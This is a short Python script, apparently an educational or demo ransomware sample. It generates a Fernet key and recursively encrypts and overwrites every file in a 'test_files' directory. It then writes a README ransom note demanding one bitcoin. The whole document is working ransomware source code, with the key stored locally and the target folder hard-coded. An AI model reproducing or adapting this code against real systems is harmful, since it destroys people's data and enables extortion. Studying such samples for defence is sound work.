from cryptography.fernet import Fernet 
import os 

def gen_key():
    key = Fernet.generate_key()
    with open("crypto.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("crypto.key", "rb").read()

def encrypt_file(archive, key):
    f = Fernet(key)
    with open(archive, "rb") as file:
        data = file.read()
    encrypt_data = f.encrypt(data)
    with open(archive, "wb") as file:
        file.write(encrypt_data)

def search_files(directory):
    list_ = []
    for source, _, archives in  os.walk(directory):
        for name in archives:
            path_ = os.path.join(source, name)
            if name != "ransomware.py" and not name.endswith(".key"):
                list_.append(path_)
    return list_

def rescue_msg():
    with open("README.txt", "w") as f:
        f.write("Your files have been encrypted\n")
        f.write("Send 1 bitcoin for wallet X then we will send a kkey to recover your data")

def main():
    gen_key()
    key = load_key()
    archives = search_files("test_files")
    for archive in archives:
        encrypt_file(archive, key)
    rescue_msg()
    print("Ransomware executed")

if __name__ == "__main__":
    main()        